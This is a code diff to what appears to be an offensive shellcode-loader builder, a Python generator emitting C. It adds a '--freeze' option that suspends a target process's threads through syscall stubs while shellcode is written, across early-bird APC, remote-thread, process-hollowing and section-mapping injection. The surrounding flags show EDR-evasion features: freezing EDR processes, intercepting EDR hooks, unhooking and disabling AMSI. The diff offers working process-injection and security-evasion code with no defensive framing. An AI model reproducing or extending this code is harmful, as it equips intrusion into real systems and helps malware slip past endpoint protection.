@@ -377,6 +377,7 @@ class CodeGenerator:
 #define ENABLE_DYNAPI       {1 if self.config.dynapi else 0}
 #define ENABLE_EDR_FREEZE   {1 if self.config.edr_freeze else 0}
 #define ENABLE_EDR_PRELOAD  {1 if self.config.edr_preload else 0}
+#define ENABLE_FREEZE       {1 if self.config.freeze else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
 
@@ -483,6 +484,9 @@ int main(int argc, char** argv) {{
     }} else {{
         LOG_SUCCESS("EDR processes frozen");
     }}
+#endif
+#if ENABLE_FREEZE
+    LOG_INFO("Thread freezing enabled — remote threads will be frozen during shellcode write");
 #endif
     
     // ========================================================================
@@ -852,6 +856,7 @@ NTSTATUS NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
 NTSTATUS NtClose(HANDLE);
 NTSTATUS NtQueueApcThread(HANDLE, PVOID, PVOID, PVOID, PVOID);
 NTSTATUS NtResumeThread(HANDLE, PULONG);
+NTSTATUS NtSuspendThread(HANDLE, PULONG);
 NTSTATUS NtWaitForSingleObject(HANDLE, BOOLEAN, PLARGE_INTEGER);
 NTSTATUS NtCreateSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
 NTSTATUS NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
@@ -971,6 +976,13 @@ NTSTATUS NtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID Arg1, PVO
 NTSTATUS NtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
     PrepareNextSyscall(IDX_NtResumeThread);
     return ((fn_NtResumeThread)DoSyscall)(ThreadHandle, SuspendCount);
+}
+
+typedef NTSTATUS (NTAPI *fn_NtSuspendThread)(HANDLE, PULONG);
+
+NTSTATUS NtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
+    PrepareNextSyscall(IDX_NtSuspendThread);
+    return ((fn_NtSuspendThread)DoSyscall)(ThreadHandle, PreviousSuspendCount);
 }
 
 NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
@@ -1798,6 +1810,10 @@ BOOL InjectCallback(PINJECTION_CONTEXT pCtx);
 DWORD FindProcessByName(LPCWSTR wszProcessName);
 BOOL ExecuteViaCallback(PVOID pShellcode);
 
+// Thread freeze helpers
+BOOL FreezeRemoteThreads(HANDLE hProcess, DWORD dwMainThreadId);
+BOOL ThawRemoteThreads(HANDLE hProcess, DWORD dwMainThreadId);
+
 #ifdef __cplusplus
 }
 #endif
@@ -1982,6 +1998,9 @@ BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx) {
 #endif
     
     SIZE_T bytesWritten = 0;
+#if ENABLE_FREEZE
+    FreezeRemoteThreads(pi.hProcess, pi.dwThreadId);
+#endif
     PrepareNextSyscall(IDX_NtWriteVirtualMemory);
     status = NtWriteVirtualMemory(pi.hProcess, pRemoteBase, pCtx->pShellcode,
                                    pCtx->dwShellcodeSize, &bytesWritten);
@@ -2033,6 +2052,9 @@ BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx) {
         CloseHandle(pi.hThread);
         return FALSE;
     }
+#if ENABLE_FREEZE
+    ThawRemoteThreads(pi.hProcess, pi.dwThreadId);
+#endif
     
     pCtx->hProcess = pi.hProcess;
     pCtx->hThread = pi.hThread;
@@ -2114,6 +2136,9 @@ BOOL InjectRemoteThread(PINJECTION_CONTEXT pCtx) {
     }
     
     SIZE_T bytesWritten = 0;
+#if ENABLE_FREEZE
+    FreezeRemoteThreads(hProcess, 0);
+#endif
     PrepareNextSyscall(IDX_NtWriteVirtualMemory);
     status = NtWriteVirtualMemory(hProcess, pRemoteBase, pCtx->pShellcode,
                                    pCtx->dwShellcodeSize, &bytesWritten);
@@ -2145,6 +2170,9 @@ BOOL InjectRemoteThread(PINJECTION_CONTEXT pCtx) {
         NtClose(hProcess);
         return FALSE;
     }
+#if ENABLE_FREEZE
+    ThawRemoteThreads(hProcess, 0);
+#endif
     
     pCtx->hProcess = hProcess;
     pCtx->hThread = hThread;
@@ -2207,6 +2235,9 @@ BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
     }
     
     SIZE_T bytesWritten = 0;
+#if ENABLE_FREEZE
+    FreezeRemoteThreads(pi.hProcess, pi.dwThreadId);
+#endif
     PrepareNextSyscall(IDX_NtWriteVirtualMemory);
     status = NtWriteVirtualMemory(pi.hProcess, pRemoteBase, pCtx->pShellcode,
                                    pCtx->dwShellcodeSize, &bytesWritten);
@@ -2242,6 +2273,9 @@ BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
     PrepareNextSyscall(IDX_NtResumeThread);
     ULONG suspendCount = 0;
     NtResumeThread(pi.hThread, &suspendCount);
+#if ENABLE_FREEZE
+    ThawRemoteThreads(pi.hProcess, pi.dwThreadId);
+#endif
     
     pCtx->hProcess = pi.hProcess;
     pCtx->hThread = pi.hThread;
@@ -2319,6 +2353,9 @@ BOOL InjectMapping(PINJECTION_CONTEXT pCtx) {
         return FALSE;
     }
     
+#if ENABLE_FREEZE
+    FreezeRemoteThreads(hProcess, 0);
+#endif
     memcpy(pLocalView, pCtx->pShellcode, pCtx->dwShellcodeSize);
     
     PVOID pRemoteView = NULL;
@@ -2349,6 +2386,9 @@ BOOL InjectMapping(PINJECTION_CONTEXT pCtx) {
         NtClose(hProcess);
         return FALSE;
     }
+#if ENABLE_FREEZE
+    ThawRemoteThreads(hProcess, 0);
+#endif
     
     NtClose(hSection);
     
@@ -2440,6 +2480,75 @@ BOOL InjectThreadPoolReal(PINJECTION_CONTEXT pCtx) {
     LOG_SUCCESS("ThreadPool Real: Execution via thread pool complete");
 #endif
     
+    return TRUE;
+}
+
+// ============================================================================
+// Thread Freeze / Thaw Helpers
+// ============================================================================
+
+BOOL FreezeRemoteThreads(HANDLE hProcess, DWORD dwMainThreadId) {
+    DWORD dwTargetPid = GetProcessId(hProcess);
+    if (!dwTargetPid) return FALSE;
+
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
+
+    THREADENTRY32 te32 = { sizeof(te32) };
+    if (!Thread32First(hSnap, &te32)) {
+        CloseHandle(hSnap);
+        return FALSE;
+    }
+
+    do {
+        if (te32.th32OwnerProcessID != dwTargetPid) continue;
+        if (dwMainThreadId != 0 && te32.th32ThreadID == dwMainThreadId) continue;
+
+        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
+        if (hThread) {
+#if DEBUG_BUILD
+            LOG_INFO("FreezeRemoteThreads: Suspending TID %lu", te32.th32ThreadID);
+#endif
+            PrepareNextSyscall(IDX_NtSuspendThread);
+            NtSuspendThread(hThread, NULL);
+            CloseHandle(hThread);
+        }
+    } while (Thread32Next(hSnap, &te32));
+
+    CloseHandle(hSnap);
+    return TRUE;
+}
+
+BOOL ThawRemoteThreads(HANDLE hProcess, DWORD dwMainThreadId) {
+    DWORD dwTargetPid = GetProcessId(hProcess);
+    if (!dwTargetPid) return FALSE;
+
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
+
+    THREADENTRY32 te32 = { sizeof(te32) };
+    if (!Thread32First(hSnap, &te32)) {
+        CloseHandle(hSnap);
+        return FALSE;
+    }
+
+    do {
+        if (te32.th32OwnerProcessID != dwTargetPid) continue;
+        if (dwMainThreadId != 0 && te32.th32ThreadID == dwMainThreadId) continue;
+
+        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
+        if (hThread) {
+#if DEBUG_BUILD
+            LOG_INFO("ThawRemoteThreads: Resuming TID %lu", te32.th32ThreadID);
+#endif
+            PrepareNextSyscall(IDX_NtResumeThread);
+            ULONG suspendCount = 0;
+            NtResumeThread(hThread, &suspendCount);
+            CloseHandle(hThread);
+        }
+    } while (Thread32Next(hSnap, &te32));
+
+    CloseHandle(hSnap);
     return TRUE;
 }
 
@@ -4905,6 +5014,9 @@ Injection Methods:
     evasion_group.add_argument('--edr-preload', action='store_true', default=False,
                                help='Prevent EDR user-mode hooks via AvrfpAPILookupCallbackRoutine intercept (default: disabled)')
     
+    evasion_group.add_argument('--freeze', action='store_true', default=False,
+                               help='Freeze all remote threads before shellcode write (default: off)')
+    
     evasion_group.add_argument('--sleep', type=int, default=0,
                                help='Initial sleep in seconds (default: 0)')
     
@@ -4962,6 +5074,7 @@ def args_to_config(args: argparse.Namespace) -> BuildConfig:
     config.dynapi = args.dynapi
     config.edr_freeze = args.edr_freeze
     config.edr_preload = args.edr_preload
+    config.freeze = args.freeze
     
     return config
 
@@ -5013,6 +5126,7 @@ def main():
         if args.unhook:                           config.unhook           = True
         if args.edr_freeze:                       config.edr_freeze       = True
         if args.edr_preload:                      config.edr_preload      = True
+        if args.freeze:                           config.freeze           = True
         if args.debug:                            config.debug            = True
         if args.sleep_obf:                        config.sleep_obfuscation = True
         if hasattr(args, 'no_amsi')    and args.no_amsi:      config.amsi             = False
